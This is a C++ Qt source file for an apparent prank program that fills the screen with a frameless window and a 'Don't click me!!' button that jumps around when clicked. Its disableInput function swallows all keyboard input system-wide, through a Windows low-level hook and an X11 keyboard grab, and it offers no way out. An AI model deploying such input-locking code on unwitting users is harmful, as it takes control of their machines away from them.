#include <QtCore/qobject.h>
#include <QtWidgets/qmainwindow.h>
#include <QtWidgets/qpushbutton.h>
#include <QtWidgets/qlabel.h>
#include <QtX11Extras/qx11info_x11.h>
#include <string>
#include <QtWidgets/QApplication>
#include <QtWidgets/QDesktopWidget>

#if defined(Q_OS_LINUX)
#include <xcb/xproto.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <QtX11Extras/QX11Info>
#endif

#if defined(Q_OS_WIN)
#include <windows.h>
#endif

int screenWidth, screenHeight;
int btnWidth = 350, btnHeight = 90;
bool clicked = false;


void disableInput(){
		
#ifdef Q_OS_WIN
    // disable all key
	SetWindowsHookEx(WH_KEYBOARD_LL, [](int nCode, WPARAM wParam, LPARAM lParam){
			return 1;
		}, NULL, 0);
#endif

#ifdef Q_OS_LINUX
    // disable all key
	XGrabKeyboard(QX11Info::display(), QX11Info::appRootWindow(), true, GrabModeAsync, GrabModeAsync, CurrentTime);
#endif
}

void getRandomCords(int cords[2]){
	int x = rand() % screenWidth;
	int y = rand() % screenHeight;
	if (x + btnWidth > screenWidth){
		x -= btnWidth;
	}
	if (y + btnHeight > screenHeight){
		y -= btnHeight;
	}
	cords[0] = x;
	cords[1] = y;
}

void showButton(QMainWindow* window){
	int cords[2];
	getRandomCords(cords);
	QPushButton *button = new QPushButton(window);
	if(!clicked)
		button->setText("Don't click me!!");
	else
		button->setText("I told you not to click me!! 😡😡");
	button->setGeometry(cords[0], cords[1], btnWidth, btnHeight);

    // set click event
	QObject::connect(button, &QPushButton::clicked, [=](){
		if (!clicked)
			btnWidth+=100;
		clicked = true;
		button->hide();
		delete button;
		showButton(window);
	});

	button->show();
}

void showText(QMainWindow* window){
    // show text at the center of the screen
	QLabel *label = new QLabel(window);
	label->setText("Nothing to see here!!");
	label->setGeometry(screenWidth / 2 - 150, screenHeight / 2 - 30, 300, 60);
	label->show();
}

int main(int argc, char *argv[]){
	QApplication a(argc, argv);
	a.setFont(QFont("Arial", 20));

	// create window
	QMainWindow *window = new QMainWindow();

    // block key presses globally
	window->setFocusPolicy(Qt::NoFocus);

    // remove window frame
	window->setWindowFlags(Qt::FramelessWindowHint);

    // get screen size
	QDesktopWidget *desktop = QApplication::desktop();
	screenWidth = desktop->width();
	screenHeight = desktop->height();

    // set window size
	window->setWindowState(Qt::WindowFullScreen);


	window->show();
	showButton(window);
	showText(window);

	disableInput();

	return a.exec();
}

